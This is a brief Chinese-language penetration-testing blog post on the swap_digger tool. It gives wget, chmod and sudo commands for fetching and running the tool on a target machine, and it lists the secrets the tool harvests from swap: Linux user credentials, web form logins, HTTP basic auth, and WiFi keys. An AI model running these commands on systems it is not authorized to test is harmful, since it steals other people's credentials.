---
title: swap_digger使用方法
date: 2024-01-13 20:29:36
tags: 渗透测试
mathjax: true
---

# swap_digger使用方法

在目标机器上下载并运行：

```bash
wget https://raw.githubusercontent.com/sevagas/swap_digger/master/swap_digger.sh
chmod +x swap_digger.sh
sudo ./swap_digger.sh -vx -c
```

-v输出冗余信息 -x获取扩展凭证 -c自动删除生成的工作目录。

功能有：自动提取swap并搜索Linux用户凭证、Web表单凭证、Web表单电子邮件、HTTP基本认证、WiFi SSID和密钥等。
